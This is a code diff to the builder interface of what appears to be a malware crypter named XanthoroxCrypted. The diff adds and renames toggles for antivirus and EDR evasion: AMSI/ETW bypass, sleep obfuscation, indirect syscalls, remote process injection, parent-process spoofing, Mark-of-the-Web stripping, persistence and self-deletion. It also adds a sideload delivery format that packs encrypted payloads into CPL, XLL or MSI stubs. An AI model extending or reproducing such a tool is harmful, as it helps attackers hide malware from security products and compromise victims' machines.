@@ -1,6 +1,7 @@
 using Microsoft.Win32;
 using System;
 using System.IO;
+using System.Reflection;
 using System.Threading.Tasks;
 using System.Windows;
 using System.Windows.Controls;
@@ -16,6 +17,8 @@ namespace XanthoroxCrypted.Views
         public BuilderView()
         {
             InitializeComponent();
+            ChkSideloadFormat.Checked += (s, e) => CmbSideloadFormat.IsEnabled = true;
+            ChkSideloadFormat.Unchecked += (s, e) => CmbSideloadFormat.IsEnabled = false;
         }
 
         private void BtnBrowse_Click(object sender, RoutedEventArgs e)
@@ -98,6 +101,7 @@ namespace XanthoroxCrypted.Views
             ChkHWIDBind.IsChecked = state;
             ChkPhantomDLL.IsChecked = state;
             ChkCallbackDiv.IsChecked = state;
+            ChkRemoteInjection.IsChecked = false; // Off by default — requires target process
             // New L21-L40 toggles
             ChkMotwStrip.IsChecked = state;
             ChkAntiEmulation.IsChecked = state;
@@ -105,6 +109,9 @@ namespace XanthoroxCrypted.Views
             ChkInflate.IsChecked = false; // Inflate defaults OFF (80MB is large)
             ChkSectionMerge.IsChecked = state;
             ChkOverlayMode.IsChecked = state;
+            // M4 toggles
+            ChkSideloadFormat.IsChecked = false; // Sideload defaults OFF
+            ChkBuildRandomization.IsChecked = state;
         }
 
         // ═══ BUILD PIPELINE ═══
@@ -204,24 +211,25 @@ namespace XanthoroxCrypted.Views
                         config.AntiDebug   = ChkAntiDebug.IsChecked == true;
                         config.AntiVM      = ChkAntiVM.IsChecked == true;
                         config.AntiSandbox = ChkAntiSandbox.IsChecked == true;
-                        config.AMSI        = ChkAMSI.IsChecked == true;
-                        config.ETW         = ChkETW.IsChecked == true;
+                        config.PatchlessAmsiEtw = ChkAMSI.IsChecked == true || ChkETW.IsChecked == true;
                         config.Fibers      = ChkFibers.IsChecked == true;
                         config.RunPE       = ChkRunPE.IsChecked == true;
                         config.ModuleStomp = ChkModuleStomp.IsChecked == true;
                         config.Persist     = ChkPersist.IsChecked == true;
                         config.Melt        = ChkMelt.IsChecked == true;
                         config.FakeError   = ChkFakeError.IsChecked == true;
-                        config.SleepObf    = ChkSleepObf.IsChecked == true;
+                        config.EkkoSleep   = ChkSleepObf.IsChecked == true;
                         config.PPIDSpoof   = ChkPPIDSpoof.IsChecked == true;
                         config.EntropyNorm = doEntropy;
                         // L11-L16 toggles
-                        config.Syscalls    = ChkSyscalls.IsChecked == true;
+                        config.IndirectSyscalls = ChkSyscalls.IsChecked == true;
                         config.ThreadPool  = ChkThreadPool.IsChecked == true;
                         config.GuardPage   = ChkGuardPage.IsChecked == true;
                         config.HWIDBind    = ChkHWIDBind.IsChecked == true;
                         config.PhantomDLL  = ChkPhantomDLL.IsChecked == true;
                         config.CallbackDiv = ChkCallbackDiv.IsChecked == true;
+                        config.RemoteInjection = ChkRemoteInjection.IsChecked == true;
+                        config.InjectionMethod = (byte)(CmbInjectionMethod?.SelectedIndex ?? 0);
                         // L21-L40 toggles
                         config.MotwStrip      = ChkMotwStrip.IsChecked == true;
                         config.AntiEmulation  = ChkAntiEmulation.IsChecked == true;
@@ -231,6 +239,10 @@ namespace XanthoroxCrypted.Views
                         config.OverlayMode    = ChkOverlayMode.IsChecked == true;
                         config.EncAlgorithm = (byte)cipherIndex;
                         config.ResearchPackage = researchPkg;
+                        // M4: Sideload delivery format
+                        config.SideloadFormat = ChkSideloadFormat.IsChecked == true;
+                        config.SideloadFormatType = (byte)(CmbSideloadFormat?.SelectedIndex ?? 0);
+                        config.BuildRandomization = ChkBuildRandomization.IsChecked == true;
                     });
 
                     // ══ VALIDATE & AUTO-FIX CONFLICTS ══
@@ -251,21 +263,44 @@ namespace XanthoroxCrypted.Views
                             ChkPhantomDLL.IsChecked  = config.PhantomDLL;
                             ChkThreadPool.IsChecked  = config.ThreadPool;
                             ChkCallbackDiv.IsChecked = config.CallbackDiv;
+                            ChkRemoteInjection.IsChecked = config.RemoteInjection;
+                            if (CmbInjectionMethod != null) CmbInjectionMethod.SelectedIndex = config.InjectionMethod;
                             ChkPersist.IsChecked     = config.Persist;
                             ChkMelt.IsChecked        = config.Melt;
                         });
                     }
 
-                    // Patch stub
-                    string appDir = AppDomain.CurrentDomain.BaseDirectory;
-                    string stubPath = Path.Combine(appDir, "..", "Stub", "Stub.exe");
-                    if (!File.Exists(stubPath))
-                        stubPath = Path.Combine(appDir, "Stub.exe");
+                    // Extract embedded stub from resources
+                    byte[] stubData;
+                    var assembly = Assembly.GetExecutingAssembly();
 
+                    // Use stub.dll for sideload DLL formats (CPL/XLL/MSI)
+                    bool needsDll = config.SideloadFormat && config.SideloadFormatType >= 1 && config.SideloadFormatType <= 3;
+                    string resourceName = needsDll ? "XanthoroxCrypted.Stub.dll" : "XanthoroxCrypted.Stub.exe";
+
+                    using (var stream = assembly.GetManifestResourceStream(resourceName))
+                    {
+                        if (stream == null && needsDll)
+                            return "ERR: Embedded Stub.dll resource not found. Run build_stub_dll.bat first.";
+                        if (stream == null)
+                            return "ERR: Embedded Stub.exe resource not found.";
+                        stubData = new byte[stream.Length];
+                        int offset = 0;
+                        while (offset < stubData.Length)
+                        {
+                            int read = stream.Read(stubData, offset, stubData.Length - offset);
+                            if (read == 0) break;
+                            offset += read;
+                        }
+                    }
+
+                    string appDir = AppDomain.CurrentDomain.BaseDirectory;
                     string outputDir = Path.Combine(appDir, "..", "Output");
+                    if (!Directory.Exists(outputDir))
+                        Directory.CreateDirectory(outputDir);
                     string outputPath = Path.Combine(outputDir, outputName);
 
-                    string err = StubPatcher.Build(stubPath, outputPath, encrypted, key, config, researchParams);
+                    string err = StubPatcher.Build(stubData, outputPath, encrypted, key, config, researchParams);
                     if (!string.IsNullOrEmpty(err))
                         return "ERR: " + err;
 
@@ -315,8 +350,8 @@ namespace XanthoroxCrypted.Views
             ChkAntiSandbox.IsChecked = config.AntiSandbox;
 
             // Telemetry
-            ChkAMSI.IsChecked = config.AMSI;
-            ChkETW.IsChecked  = config.ETW;
+            ChkAMSI.IsChecked = config.PatchlessAmsiEtw;
+            ChkETW.IsChecked  = config.PatchlessAmsiEtw;
 
             // Execution
             ChkFibers.IsChecked      = config.Fibers;
@@ -329,17 +364,19 @@ namespace XanthoroxCrypted.Views
             ChkFakeError.IsChecked = config.FakeError;
 
             // Advanced evasion
-            ChkSleepObf.IsChecked    = config.SleepObf;
+            ChkSleepObf.IsChecked    = config.EkkoSleep;
             ChkPPIDSpoof.IsChecked   = config.PPIDSpoof;
             ChkEntropyNorm.IsChecked = config.EntropyNorm;
 
             // New L11-L16 toggles
-            ChkSyscalls.IsChecked    = config.Syscalls;
+            ChkSyscalls.IsChecked    = config.IndirectSyscalls;
             ChkThreadPool.IsChecked  = config.ThreadPool;
             ChkGuardPage.IsChecked   = config.GuardPage;
             ChkHWIDBind.IsChecked    = config.HWIDBind;
             ChkPhantomDLL.IsChecked  = config.PhantomDLL;
             ChkCallbackDiv.IsChecked = config.CallbackDiv;
+            ChkRemoteInjection.IsChecked = config.RemoteInjection;
+            if (CmbInjectionMethod != null) CmbInjectionMethod.SelectedIndex = config.InjectionMethod;
 
             // New L21-L40 toggles
             ChkMotwStrip.IsChecked     = config.MotwStrip;
@@ -348,6 +385,9 @@ namespace XanthoroxCrypted.Views
             ChkInflate.IsChecked       = config.Inflate;
             ChkSectionMerge.IsChecked  = config.SectionMerge;
             ChkOverlayMode.IsChecked   = config.OverlayMode;
+            // M4 toggles
+            ChkSideloadFormat.IsChecked = config.SideloadFormat;
+            ChkBuildRandomization.IsChecked = config.BuildRandomization;
 
             _suppressPresetChange = false;
 
